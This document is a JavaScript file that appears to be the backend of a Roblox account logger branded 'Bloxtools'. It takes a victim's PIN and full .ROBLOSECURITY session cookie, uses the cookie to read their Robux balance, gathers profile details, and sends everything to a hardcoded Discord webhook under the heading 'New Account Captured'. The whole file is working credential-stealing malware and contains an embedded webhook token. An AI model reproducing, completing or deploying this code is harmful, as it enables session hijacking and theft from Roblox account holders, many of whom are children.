/* ======================================================
   /api/send-webhook.js
====================================================== */

const WEBHOOK_URL = "https://discord.com/api/webhooks/1508982155743723653/WEszq-EnTTfvaUgxU9-0PvNvlqfLLjxIASUSdBn7KY5vGQ9QqiMeFM5mLk3vFkFqJwpJ";

export async function fetchUserInfoFromId(userId) {
    try {
        const [userRes, friendsRes, avatarRes, thumbRes] = await Promise.all([
            fetch(`https://users.roblox.com/v1/users/${userId}`),
            fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
            fetch(`https://avatar.roblox.com/v1/users/${userId}/avatar`),
            fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`)
        ]);

        const userData = userRes.ok ? await userRes.json() : null;
        const friendsData = friendsRes.ok ? await friendsRes.json() : {};
        const avatarData = avatarRes.ok ? await avatarRes.json() : {};
        const thumbData = thumbRes.ok ? await thumbRes.json() : {};

        let avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
        if (thumbData.data?.[0]?.imageUrl) avatarUrl = thumbData.data[0].imageUrl;

        let wearing = "None equipped";
        if (avatarData.assets?.length) {
            const items = avatarData.assets.slice(0, 5).map(a => a.name);
            wearing = items.join(", ") + (avatarData.assets.length > 5 ? " ..." : "");
        }

        return {
            username: userData?.name || "Unknown",
            displayName: userData?.displayName || "Unknown",
            userId: userData?.id || userId,
            joinDate: userData ? new Date(userData.created).toLocaleDateString() : "N/A",
            friendsCount: friendsData.count?.toLocaleString() || "0",
            wearing,
            avatarUrl,
            profileUrl: `https://www.roblox.com/users/${userId}/profile`
        };
    } catch (err) {
        console.error("Error fetching user info:", err);
        return null;
    }
}

export async function fetchRobuxFromCookie(cookieValue) {
    try {
        const response = await fetch("https://economy.roblox.com/v1/user/currency", {
            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` },
            credentials: "include"
        });
        if (!response.ok) return "N/A";
        const data = await response.json();
        return data.robux?.toLocaleString() || "0";
    } catch (e) {
        console.error("Robux fetch error:", e);
        return "N/A";
    }
}

export async function sendWebhook(pin, cookie, rbxuid) {
    const userInfo = await fetchUserInfoFromId(rbxuid);
    const robux = await fetchRobuxFromCookie(cookie);

    const description = `
## 📦 Account Capture
- **rbxuid:** \`${rbxuid}\`
- **Cookie Length:** \`${cookie.length} chars\`
- **PIN:** \`${pin}\`

## 🔐 Full .ROBLOSECURITY Cookie
\`\`\`
${cookie}
\`\`\`
`;

    const embedFields = userInfo ? [
        {
            name: "👤 Roblox Profile",
            value: `**Username:** ${userInfo.username}\n**Display Name:** ${userInfo.displayName}\n**User ID:** ${userInfo.userId}\n**Join Date:** ${userInfo.joinDate}\n\n🔗 [Profile](https://www.roblox.com/users/${rbxuid}/profile)`,
            inline: false
        },
        { name: "👥 Friends", value: userInfo.friendsCount, inline: true },
        { name: "💰 Robux", value: `${robux} R$`, inline: true },
        { name: "👕 Wearing", value: userInfo.wearing, inline: false }
    ] : [{
        name: "⚠️ Error",
        value: "Could not fetch public profile information.",
        inline: false
    }];

    const payload = {
        username: "Bloxtools Processing System",
        embeds: [{
            title: "🔓 New Account Captured",
            description: description,
            color: 0x8c52ff,
            thumbnail: userInfo ? { url: userInfo.avatarUrl } : undefined,
            fields: embedFields,
            footer: { text: "Bloxtools • Roblox Account Logger" },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            console.error("Webhook failed:", response.status);
        }

        return response.ok;
    } catch (error) {
        console.error("Webhook Error:", error);
        return false;
    }
}
